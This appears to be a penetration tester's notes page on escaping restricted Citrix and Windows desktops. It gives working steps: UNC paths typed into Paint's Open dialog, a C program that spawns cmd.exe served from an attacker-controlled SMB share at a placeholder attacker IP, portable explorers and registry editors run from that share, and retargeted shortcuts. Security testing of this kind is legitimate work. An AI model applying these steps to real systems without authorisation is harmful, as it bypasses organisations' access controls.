---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "CITRIX BREAKOUT"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Theory*

***Citrix*** is a remote desktop platform, such as *Windows Terminal Service ( mstsc )*, that companies use to give remote access to their employees to certain software *( e.g. ERP Client )* or full desktop enviroments

Therefore, any employee can establish a remote connection through the *Citrix Gateway*, which prompts for authentication

Once the former has authenticated correctly, he will have access to either a single window of a specific application or a full desktop enviroment

##### *Basic Break-Out Methodology*

If after a successfull *CITRIX* authentication, we land on a restricted *Windows* environment where only the window of a specific application is accesible or we are just very limited

> ***e.g. Cannot locate cmd.exe or powershell.exe from the Start Menu or we get an "Access Denied" error when trying to access `C:\Windows\System32` and so on***

We could try proceeding as follows →

- ***Gain access to a Dialog Box i.e. Save as, Open File and so on***

- ***Leverage the Dialog Box to achieve command execution***

- ***Escalate Privileges to gain higher level of access***

---

#### *Bypassing Path Restrictions*

##### *Workflow*

Let's supose that we get the following error when we try to access the **`C:\Users`** location using *File Explorer*

![[CITRIX BREAKOUT-20260501172237379.webp|300]]

> ***Zoom in***

In this case, it seems that there is a *[[WINDOWS GROUP POLICIES|Group Policy Object ( GPO )]]* that restricts users to browse any existing directory within **`C:\`**

We could simply bypass this scenario by leveraging *Windows Dialog Boxes* opened from a certain application feature, such as *Save As* or *Open File* in *Paint* or *notepad.exe*

Once we are on a *Windows Dialog Box*, we can leverage it to navigate to a folder path containing native executables that offer an interactive console *( e.g. cmd.exe )*

This time, we can simply access the given *Dialog Box* from a certain application and enter the following *UNC Path* to try accessing the **`C:\Users`** directory

##### *Requirements*

- ***Our current user must have permissions to open an application from which we can access to a Windows Dialog Box***

##### *Abuse*

###### *Leveraging an application features to access a Windows Dialog Box*

> ***MS Paint***

Simply run *Paint* from start menu and click on *File → Open*

![[CITRIX BREAKOUT-20260501173509976.webp|300]]

> ***Zoom in***

###### *Accessing the desired system location from the Dialox Box*

As stated, simply enter the following *UNC Path* in the address bar

```bash
\\127.0.0.1\c$\Users
```

![[CITRIX BREAKOUT-20260501173722717.webp|350]]

> ***Zoom in***

---

#### *SMB Share Access to Code Execution*

##### *Workflow*

As we saw in ***[[#Bypassing Path Restrictions|this]]*** section, once we open a *Windows Dialog Box* from a certain available application, we are able to access *SMB* shares, such as **`C$`**

Therefore, an operator could set up an ***[[FILE TRANSFERS#File Transfer Servers#Smbserver (Impacket)|SMB Server]]*** and share an executable file that spawns a *cmd.exe* or *powershell.exe* instance

Once we have access to the terminal in question, our scope of action expands significantly

For instance, we may not be able to copy the available resources within the attacker's *SMB* share using *C-c* and *C-v* due to the presence of restrictions within the *File Explorer*

So we can simply run the mentioned executable to spawn a *cmd.exe* and be able to copy the needed resources to any system location where our current user has *WRITE* permissions

##### *Requirements*

- ***Our current user must have permissions to open an application from which we can access to a Windows Dialog Box***

##### *Abuse*

###### *Compiling the executable*

> ***From the attacker*** ⚔️

- ***Creating a pwn.c resource***

> [!BUG]- *pwn.c*
>
> ```bash
> #include <stdlib.h>
> 
> int main(void) {
>     system("C:\\Windows\\System32\\cmd.exe /K cd /d %TEMP%");
>     return 0;
> }
> ```
>

- ***Compiling the binary for 64-bit systems***

```bash
sudo apt update && sudo apt install -y -- mingw-w64
```

```bash
x86_64-w64-mingw32-gcc pwn.c -o pwn.exe
file !$
```

###### *Setting up an SMB Server*

> ***From the attacker*** ⚔️

```bash
smbserver.py -smb2support -user '<USER>' -password '<PASSWD>' '<SHARE>' '<LOCAL_PATH>'
```

###### *Running the executable*

> ***From the target*** 🎯

- ***Enter the following UNC Path on the Windows Dialog Box's address bar***

```bash
\\<ATTACKER_IP>\<SHARE>
```

![[CITRIX BREAKOUT-20260501181236529.webp|350]]

> ***Zoom in***

- ***Run the binary***

![[CITRIX BREAKOUT-20260501181438966.webp|350]]

> ***Zoom in***

![[CITRIX BREAKOUT-20260501181521502.webp|350]]

> ***Zoom in***

---

#### *Alternate Explorer*

##### *Workflow*

As we mentioned in other sections, we may land on a *Windows desktop environment* where some kind of *GPO* is applied, and thus we cannot directly copy files from a certain *SMB* share to our local file system

Another approach would be to download a portable version of an alternative file explorer from the attacker  that works on *Windows* systems and share this resources via *SMB*

Then, as in other sections, we can leverage some features on certain applications in order to open a *Windows Dialog Box* and, hence, be able to enter a *UNC* path to access the attacker's *SMB* share and run the alternative file explorer

##### *Requirements*

- ***Our current user must have permissions to open an application from which we can access to a Windows Dialog Box***

##### *Abuse*

###### *Alternative File Explorer Setup*

> ***[Explorer++](https://explorerplusplus.com/)***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://download.explorerplusplus.com/stable/1.4.0/explorerpp_x64.zip'
```

```bash
unzip explorerpp_x64.zip Explorer++.exe
```

###### *Setting up an SMB Server*

> ***From the attacker*** ⚔️

```bash
smbserver.py -smb2support -user '<USER>' -password '<PASSWD>' '<SHARE>' '<LOCAL_PATH>'
```

###### *Running the executable*

> ***From the target*** 🎯

- ***Enter the following UNC Path on the Windows Dialog Box's address bar***

```bash
\\<ATTACKER_IP>\<SHARE>
```

![[CITRIX BREAKOUT-20260501184232764.webp|350]]

> ***Zoom in***

![[CITRIX BREAKOUT-20260501184333316.webp|350]]

> ***Zoom in***

---

#### *Alternate Registry Editors*

##### *Workflow*

As with ***[[#Alternate Explorer|Alternate Explorers]]***, we can carry out the same steps if we deal with a restricted desktop environment where the default *Windows Registry Editor* is blocked by groups policies

This time, we can download a software that allows us to view and edit the *Windows Registry* with a *UI* from the attacker

##### *Requirements*

- ***Our current user must have permissions to open an application from which we can access to a Windows Dialog Box***

##### *Abuse*

> ***Same steps as [[#Alternative File Explorer Setup|here]]***

> ***[Simpleregedit](https://sourceforge.net/projects/simpregedit/)***

> ***[UberRegEdit](https://sourceforge.net/projects/uberregedit/)***

> ***[SmallRegistryEditor](https://sourceforge.net/projects/sre/)***

---

#### *Shortcut's target modification to Code Execution*

##### *Workflow*

Another approach in order to achive code execution by spawning a *cmd.exe* or *powershell.exe* instance would be to search for *shortcut* files for which our current user has *WRITE* permissions

Once we find a shortcut file, we can replace its *Target* metadata property value with the following one

```bash
C:\Windows\System32\cmd.exe
```

It will simply open a *cmd.exe* instance once we click on the shortcut file as it points to the former

> ***If we do not find any writable shortcut file, just create one from the attacker pointing to the location above and transfer it to the system***

##### *Requirements*

- ***The controlled user account must be WRITE permissions over the given shortcut file***

##### *Abuse*

###### *Modifying the Target property of a Shortcut File*

> ***Shortcut File → Properties → Shortcut → Target***

![[CITRIX BREAKOUT-20260501191507648.webp|350]]

> ***Zoom in***

###### *Opening the File Shortcut*

![[CITRIX BREAKOUT-20260501191619350.webp|350]]

> ***Zoom in***

---

#### *Script File Execution*

##### *Workflow*

Usually script extensions such as *.BAT*, *.VBS* or *.PS1* are configured to automatically execute their code using their corresponding interpreters

Therefore, we could simply create a *pwn.bat* script that spawns a *cmd.exe* instance, save its content and run it

##### *Abuse*

###### *Creating and running the .BAT script*

![[CITRIX BREAKOUT-20260501193620315.webp|400]]

> ***Zoom in***

---

#### *Resources*

***[Breaking out of Citrix and other Restricted Desktop Enviroments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)***

***[Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)***